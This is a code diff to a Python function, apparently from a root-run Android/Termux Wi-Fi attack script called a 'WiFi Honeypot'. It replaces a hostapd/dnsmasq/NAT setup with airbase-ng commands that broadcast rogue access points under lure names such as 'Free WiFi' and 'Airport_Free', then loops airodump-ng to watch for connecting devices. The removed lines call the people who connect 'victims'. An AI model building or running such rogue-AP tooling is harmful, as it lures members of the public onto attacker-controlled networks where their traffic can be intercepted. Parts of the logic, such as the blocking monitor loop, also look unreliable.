@@ -298,39 +298,30 @@ def create_multiple_aps(interface):
     try:
         print(f"{Fore.GREEN}[+] Starting WiFi Honeypot...{Fore.RESET}")
         
-        # Install dnsmasq if not present
-        os.system("pkg install dnsmasq -y")
-        
-        # Setup network
+        # Setup monitor mode manually
         os.system(f"su -c 'ifconfig {interface} down'")
         os.system(f"su -c 'iwconfig {interface} mode monitor'")
         os.system(f"su -c 'ifconfig {interface} up'")
         
-        # Enable internet sharing
-        os.system(f"su -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'")
-        os.system(f"su -c 'iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE'")
-        os.system(f"su -c 'iptables -A FORWARD -i {interface} -j ACCEPT'")
-        
-        # Start DHCP server
-        os.system(f"su -c 'dnsmasq --interface={interface} --dhcp-range=192.168.1.2,192.168.1.100,12h'")
-        
-        # Create APs
+        # Common network names
         ssid_list = ["Free WiFi", "Guest Network", "Public WiFi", "Coffee Shop", "Airport_Free"]
-        for ssid in ssid_list:
-            os.system(f"su -c 'hostapd -B /data/data/com.termux/files/home/{ssid}.conf'")
-            print(f"{Fore.GREEN}[+] Created AP: {ssid}{Fore.RESET}")
         
-        print(f"{Fore.GREEN}[+] Network ready! Victims will have internet access{Fore.RESET}")
+        # Create multiple APs using airbase-ng
+        for i, ssid in enumerate(ssid_list):
+            channel = random.randint(1, 11)  # Random channel for each AP
+            os.system(f"su -c 'airbase-ng -e \"{ssid}\" -c {channel} {interface} &'")
+            print(f"{Fore.GREEN}[+] Created AP: {ssid} on channel {channel}{Fore.RESET}")
+            time.sleep(1)  # Small delay between creating APs
         
+        print(f"\n{Fore.GREEN}[+] All APs created! Monitoring for connections...{Fore.RESET}")
+        
+        # Monitor for connections
         while True:
-            # Rest of the code...
-            pass
-        
+            os.system(f"su -c 'airodump-ng {interface}'")
+            
     except KeyboardInterrupt:
         print(f"\n{Fore.YELLOW}[*] Cleaning up...{Fore.RESET}")
-        os.system(f"su -c 'killall hostapd'")
-        os.system(f"su -c 'iptables -F'")
-        os.system(f"su -c 'iptables -t nat -F'")
+        os.system(f"su -c 'killall airbase-ng'")
         os.system(f"su -c 'ifconfig {interface} down'")
         os.system(f"su -c 'iwconfig {interface} mode managed'")
         os.system(f"su -c 'ifconfig {interface} up'")
